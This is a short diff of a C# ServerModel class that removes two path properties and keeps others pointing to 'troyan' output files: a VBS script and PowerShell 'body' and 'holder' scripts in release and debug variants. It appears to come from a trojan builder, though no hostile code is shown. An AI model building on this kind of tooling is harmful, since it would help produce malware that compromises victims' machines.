@@ -35,12 +35,10 @@ public class ServerModel
     [JsonPropertyName("troyanVbsRelease")] public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");
 
     [JsonPropertyName("body")] public string Body => Path.Join(TroyanOutputDir, "body.txt");
-    [JsonPropertyName("bodyPreRelease")] public string BodyPreRelease => Path.Join(TroyanOutputDir, "body.pre.release.ps1");
     [JsonPropertyName("bodyRelease")] public string BodyRelease => Path.Join(TroyanOutputDir, "body.release.ps1");
     [JsonPropertyName("bodyDebug")] public string BodyDebug => Path.Join(TroyanOutputDir, "body.debug.ps1");
 
     [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
-    [JsonPropertyName("holderPreRelease")] public string HolderPreRelease => Path.Join(TroyanOutputDir, "holder.pre.release.ps1");
     [JsonPropertyName("holderRelease")] public string HolderRelease => Path.Join(TroyanOutputDir, "holder.release.ps1");
     [JsonPropertyName("holderDebug")] public string HolderDebug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
 
